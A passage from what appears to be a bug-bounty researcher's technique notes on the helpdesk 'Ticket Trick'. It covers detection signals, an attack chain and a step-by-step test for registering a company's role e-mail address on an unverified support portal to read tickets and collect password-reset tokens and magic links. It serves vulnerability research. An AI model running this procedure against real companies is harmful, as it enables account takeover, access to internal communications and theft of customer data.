  7. THE IMPACT LADDER, verbatim: join the company's Slack channels ("I was greeted by the list of channels I was able to join"); join the Yammer intranet; "because we can read e-mails sent to support@, we can also see any password reset link sent to that e-mail address… quite a few companies use this exact e-mail address to sign up for third party services and social media like Twitter. This means an attacker could also hijack any account linked to the support@ mail address" — "I was able to hijack multiple Twitter accounts with over one million followers"; and "By registering no-reply@company.com, you could intercept the password reset token for support@company.com and gain access to privileged accounts providing access to all customer information."
DETECTION SIGNAL: a support/help-center subdomain (Zendesk/Kayako/Freshdesk/WHMCS or a custom portal) whose REGISTRATION does not require e-mail verification (or where the verification is bypassable via an SSO/social-login path); a "forgot password"/"my tickets" page reachable after registering with an arbitrary address; a role address (`support@`, `feedback@`, `no-reply@`, `billing@`) that receives third-party transactional mail (Slack magic links, password resets, OTPs); a Slack/Yammer/Workplace instance whose join policy is "anyone with the company domain".
CHAIN: any unauthenticated attacker (primitive: the support portal allows registration with an unverified address) -> register with a ROLE address the company receives mail at (`support@`/`feedback@`/`no-reply@`) (primitive: the portal creates a ticket for that address and shows it to the registrant) -> read the tickets (escalation: the mailbox's inbound mail is rendered as support tickets) -> the ticket holds the third-party MAGIC VERIFICATION LINK / password-reset token (escalation: a credential for the company's Slack/Yammer/Twitter/portal account) -> join the internal comms or reset the privileged account's password (impact: internal Slack/Yammer channel access, social-media hijack, privileged account takeover with customer data; the writeup records bounties of $1,000–$8,000 and a $2,000 Vimeo award). Per doctrine §8: preconditions = a support portal that registers unverified addresses AND a company role address that receives third-party transactional mail AND a communication tool that admits the company domain; gain = read of the role address's mail = the magic links / reset tokens = internal-comms join + social/privileged-account hijack.
TRANSFERABLE TEST: for every in-scope company, (1) enumerate its support/help-center subdomains and register with a ROLE address (`support@`, `feedback@`, `no-reply@`, `billing@`) — no verification; (2) check whether the portal shows "my tickets" for an address that never verified; (3) trigger a third-party password reset or magic-link mail to that address (e.g. Slack "find your workspace", Twitter password reset) and see whether the link appears in the ticket; (4) test the SSO/social-login path on the same portal for an unverified address; (5) check the communication tool's join policy (Slack "find your workspace", Yammer/Workplace domain join). Rule: **a support desk that creates readable tickets for an UNVERIFIED address is a mailbox-read primitive — register the company's own role address, read its tickets, and harvest the magic links / reset tokens that address receives.**
DEDUPE: 0 hits for `235139`, `unverified e-mail registration`, `support desk`, `Ticket Trick` (as a technique), `feedback@slack.com`, `find your workspace`, `intidc`/`intideceukelaire` (the §17.223 entry records the same author's LLM/email-layer work but not the helpdesk ticket trick). Pre-existing material REVIEWED as related-but-distinct: §17.223 (the same author's email-layer parser differentials against an AI agent — header-vs-envelope `From`, RFC 5322 comments, OTP exfil from a shared inbox — a DIFFERENT surface from a support portal's unverified registration), §17.285 / #1018489 (a BOLA on an account-linking endpoint plus a missing e-mail-verification gate -> a backdoor login method — an ACCOUNT-LINKING bug, not a support-desk mailbox read), §17.229 / Mailcow (an admin Autodiscover log as a stored-XSS sink — the same `Autodiscover` endpoint but an XSS render, not an unauthenticated mailbox read), the ledger's "email change -> ATO" and "password-reset token in a response" entries (different primitives). New general method -> §17.362.

SOURCE: https://hackerone.com/reports/3020733  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 6,963 B, `visibility: full`, `vulnerability_information` 1,417 B read IN FULL.
STATUS: UNVERIFIED (not reproduced — no Malwarebytes account was touched this pass; the steps and the OTP behaviour are verbatim from the report body).
